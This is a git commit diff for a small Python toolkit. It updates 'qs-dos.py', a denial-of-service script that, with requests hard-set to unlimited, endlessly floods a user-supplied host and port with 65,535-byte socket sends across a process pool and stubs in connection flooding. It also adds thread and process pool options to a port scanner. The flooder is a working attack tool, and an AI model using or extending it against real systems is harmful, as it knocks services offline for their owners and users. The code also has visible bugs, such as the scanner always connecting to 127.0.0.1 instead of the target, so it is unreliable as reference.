80cd7385d959dc184d57baa72cfa4ac7afd18679
Ryan Kleffman <ryankleffman47@gmail.com>
2023-06-18 17:13:38 -0500

    Updates to qs-portscan
    got rid of -sp, replaced with -pa (process allocation) argument. users can now select threadpool, processpool, or single/singleprocess for the concurrency options.
    
    Socket scanning is also implemented.

--- qs-dos.py
+++ qs-dos.py
@@ -28,32 +28,73 @@ class DOS:
         self.port = int(port)
         self.requests = requests
 
+    def __str__(self):
+        return f"=== Scan Details: target: {self.target} port= {self.port} reqeusts {self.requests} ==="
+
+    @execution_time
     def dos_scan(self):
         ## need to move this later, lots of options to consider here
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #sock.setblocking(False)
         sock.connect((self.target, self.port))
+
+        data = ("*" * 65535).encode()
 
         if self.requests == 0:
             with ProcessPoolExecutor() as executor:
                 while True:
-                    futures = [executor.submit(self._socket_dos_implementation, self.target, "port", "packet_size", sock)]
+                    futures = [executor.submit(self._socket_packetoverload_dos_implementation, self.target, "port", "packet_size", sock, data)]
         
         else:
             with ProcessPoolExecutor() as executor:
-                futures = [executor.submit(self._socket_dos_implementation, self.target, "port", "packet_size", sock) for request in range(1,self.requests)]
+                for _ in range(1,self.requests):
+                   print(_)
+                   executor.submit(self._socket_packetoverload_dos_implementation, self.target, "port", "packet_size", sock, data)
 
 
-    def _socket_dos_implementation(self, ip="", port=1, packet_size=10, sock=None):
+    def _socket_connection_dos_implementation(self, ip="", port=1, packet_size=10, sock=None):
         '''
         The actual logic behind the DOS scan. Gets called for each request. This allows for
         additional handling/cleanliness/flexibility
+
+        This is for general connection based DOSing, i.e connect and disconnect a ton of times
 
         Sock gets passed in here, because it's apparently faster to pass it
         '''
         #sock.send or sock.connect? 2 different types of DOS'ing
 
         #sock.connect
-        #print("request")
+        try:
+            sock.connect((self.target, self.port))
+
+            #print("request")
+            sock.close()
+        except Exception as e:
+            print(e)
+
+        #sock.send(ip, port)
+        #pass
+
+    def _socket_packetoverload_dos_implementation(self, ip="", port=1, packet_size=10, sock=None, data=None):
+        '''
+        The actual logic behind the DOS scan. Gets called for each request. This allows for
+        additional handling/cleanliness/flexibility
+
+        Sock gets passed in here, because it's apparently faster to pass it
+        '''
+        try:
+            sock.send(data)
+
+        except Exception as e:
+            print(e)
+
+        #sock.send(ip, port)
+        #pass
+
+    def _http_dos_implementation(self, ip="", port=1, packet_size=10, sock=None):
+        '''
+        HTTP handler for HTTP specific DOSing
+        '''
         pass
 
     
@@ -68,10 +109,12 @@ if __name__ == "__main__":
 
     parser.add_argument('-t', '--target', help="The target you wish to scan. Can be an IP, FQDN, or hostname. Example: 'qs-portscan -t 192.168.0.1'", required=True) 
     parser.add_argument('-p', '--port', help="The port of the service you are targeting", required=True) 
+    parser.add_argument('-m', '--method', help="The method/protocl you want to use. These are optimized for specific applications, the default behavior is to just throw packets at the services",
+                        default=10, type=int)
 
     #parser.add_argument('-r', '--rps', help="Requests per second (Is a goal, not a guaranteed rate)", default=1000000)
-    parser.add_argument('-r', '--requests', help="The amount of requests to send. 0 for unlimited", default=1000000, type=int)
-    parser.add_argument('-mx', '--multiplier', help="The request multiplier. Makes it easier to send a lot more requests. Default is 10x", default=10, type=int)
+    #parser.add_argument('-r', '--requests', help="The amount of requests to send. 0 for unlimited", default=1000000, type=int)
+    #parser.add_argument('-mx', '--multiplier', help="The request multiplier. Makes it easier to send a lot more requests. Default is 10x", default=1, type=int)
     parser.add_argument('-d', '--debug', help="Prints debug information", action="store_true")  
 
     args = parser.parse_args()
@@ -85,7 +128,8 @@ if __name__ == "__main__":
     dos = DOS(
         target = args.target,
         port = args.port,
-        requests = args.requests * args.multiplier
+        # being finnicky, just letting it go as fast as it wants
+        requests = 0#args.requests * args.multiplier
 
     )
 
--- qs-portscan.py
+++ qs-portscan.py
@@ -25,31 +25,80 @@ def execution_time(func):
     return wrapper
 
 class PortScan:
-    def __init__(self, ports=[1,1024], timeout=0.5, target="127.0.0.1", method=""):
+    def __init__(self, ports=[1,1024], timeout=0.5, target="127.0.0.1", method="", process_allocation="threadpool"):
         self.target = target
         self.timeout = float(timeout)
         self.ports = self._port_sort(ports)
         self.method = method
+        self.process_allocation = process_allocation
 
     def __str__(self):
-        return f"=== Scan Details: target: {self.target} timeout= {self.timeout} ports= {self.ports[0]}-{self.ports[-1]} method= {self.method} ==="
-
+        return f"=== Scan Details: target: {self.target} timeout: {self.timeout} ports: {self.ports[0]}-{self.ports[-1]} method: {self.method} process allocation: {self.process_allocation} ==="
+    
+    @execution_time
     def socket_scan(self):
         '''
         Standard socket portsan - single thread/process
         '''
-        pass
+        print(f"{error_block} Warning! Using single process mode. This will take longer than usual, and is included only for compatability reasons")
+        for port_to_scan in self.ports:
+            self._socket_scan_implementation(ip=self.target, port=port_to_scan, timeout=self.timeout)
 
+    @execution_time
     def socket_multiprocess_scan(self):
         '''
         Threadexecutor'd socket multiprocess scan
         '''
-        pass
+        #sock.setblocking(False)
+
+        #sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #sock.setblocking(False)
+
+        '''
+        Cool idea: Could make 4 socket objects, and rotate which gets used. would eliminate overhead
+        of creating a new sock each time
+        
+        '''
+        if self.process_allocation == "processpool":
+            with ProcessPoolExecutor() as executor:
+                futures = [executor.submit(self._socket_scan_implementation, self.target, port, self.timeout) for port in self.ports]
+                #wait(futures, timeout=2)
+        elif self.process_allocation == "threadpool":
+            with ThreadPoolExecutor() as executor:
+                futures = [executor.submit(self._socket_scan_implementation, self.target, port, self.timeout) for port in self.ports]
+                #wait(futures, timeout=2)   
+        elif self.process_allocation == "singleprocess" or self.process_allocation == "single":
+            print(f"{error_block} Warning! Using single process mode. This will take longer than usual, and is included only for compatability reasons")
+            for port_to_scan in self.ports:
+                self._socket_scan_implementation(ip=self.target, port=port_to_scan, timeout=self.timeout)
+        else:
+            print(f"Invalid process_allocation option: {self.process_allocation}")
+
+        print("Done!")
+
+    def _socket_scan_implementation(self, ip="127.0.0.1", port=1, timeout=.5):
+        try:
+            # have to create a socket object each time as otherwise the sockets error out.
+            # fix here: https://stackoverflow.com/questions/54437148/python-socket-connect-an-invalid-argument-was-supplied-oserror-winerror
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(timeout)
+            sock.connect(("127.0.0.1", port))
+            print(f"{self.target}:{port} is open")
+        
+        except (ConnectionError, ConnectionRefusedError, TimeoutError) as e:
+            pass
+
+        except ConnectionResetError as re:
+            print(f"{self.target}:{port} reset. Test Manually")
+        
+        except Exception as e:
+            print(e)
 
     def telnet_scan(self):
         '''
         standard telnet scan
         '''
+        print(f"{error_block} Warning! Using single process mode. This will take longer than usual, and is included only for compatability reasons")
 
         for port_to_scan in self.ports:
             self._telnet_scan_implementation(ip=self.target, port=port_to_scan)
@@ -63,10 +112,22 @@ class PortScan:
         Threadexecutor'd telnet multiprocess scan
         '''
         ##ThreadPoolExecutor: - is faster, uses one core, but multiple processes
-        #ThreadPoolExecutor()#, literally a drop in replacement. Multicore, a (fair, about 2/3rds) bit slower due to overhead for IO tasks
-        with ProcessPoolExecutor() as executor:
-            futures = [executor.submit(self._telnet_scan_implementation, self.target, port) for port in self.ports]
-            #wait(futures, timeout=2)
+        #ProcessPoolExecutor()#, literally a drop in replacement. Multicore, a (fair, about 2/3rds) bit slower due to overhead for IO tasks
+
+        if self.process_allocation == "processpool":
+            with ProcessPoolExecutor() as executor:
+                futures = [executor.submit(self._telnet_scan_implementation, self.target, port) for port in self.ports]
+                #wait(futures, timeout=2)
+        elif self.process_allocation == "threadpool":
+            with ThreadPoolExecutor() as executor:
+                futures = [executor.submit(self._telnet_scan_implementation, self.target, port) for port in self.ports]
+                #wait(futures, timeout=2)   
+        elif self.process_allocation == "singleprocess" or self.process_allocation == "single":
+            print(f"{error_block} Warning! Using single process mode. This will take longer than usual, and is included only for compatability reasons")
+            for port_to_scan in self.ports:
+                self._telnet_scan_implementation(ip=self.target, port=port_to_scan)
+        else:
+            print(f"Invalid process_allocation option: {self.process_allocation}")
 
         print("Done!")
 
@@ -142,9 +203,9 @@ if __name__ == "__main__":
     parser.add_argument('-t', '--target', help="The target you wish to scan. Can be an IP, FQDN, or hostname. Example: 'qs-portscan -t 192.168.0.1'", required=True) 
     parser.add_argument('-p', '--ports', help="The port(s) to scan. For a port range, enter as such: '1-1024', or for select ports: '22,23,80,443'", default="1-1024") 
     parser.add_argument('-m', '--method', help="The method used to portscan, current options are telnet and socket. Defaults to the fastest implementation available.", default="telnet") 
-    parser.add_argument('-sp', '--singleprocess', action="store_true",
-                        help="Reduces scanning to a single process. Each port has to wait for the previous scan to complete, so this takes much longer. Included for compatability reasons.")
-    parser.add_argument('-to', '--timeout', help="The time the protocol will wait for a repsonse from the port. '.5' (seconds) is the default. I would not reccomend going any lower unless you are LAN scanning", default=.5)  
+    parser.add_argument('-pa', '--processallocation', default = "threadpool",
+                        help="Which method of concurrency to use, 'threadpool' (multiprocess, subject to GIL), 'processpool' (multicore, better for CPU intensive items.) or 'singleprocess' for no concurrency. YMMV, included for compatibility")
+    parser.add_argument('-to', '--timeout', help="The time the protocol will wait for a repsonse from the port. '.5' (seconds) is the default. I would not reccomend going any lower unless you are LAN scanning", default=.25)  
     parser.add_argument('-d', '--debug', help="Prints debug information", action="store_true")  
     args = parser.parse_args()
 
@@ -158,7 +219,8 @@ if __name__ == "__main__":
         target = args.target,
         ports = args.ports,
         timeout = args.timeout,
-        method = args.method
+        method = args.method,
+        process_allocation = args.processallocation
     )
 
     # Logic tree
@@ -167,13 +229,9 @@ if __name__ == "__main__":
 
 
     if args.method == "telnet":
-        if not args.singleprocess:
-            scanner.telnet_multiprocess_scan()
-        else:
-            scanner.telnet_scan()
+        scanner.telnet_multiprocess_scan()
+
 
     elif args.method == "socket":
-        if not args.singleprocess:
-            scanner.socket_multiprocess_scan()
-        else:
-            scanner.socket_scan()
+        scanner.socket_multiprocess_scan()
+
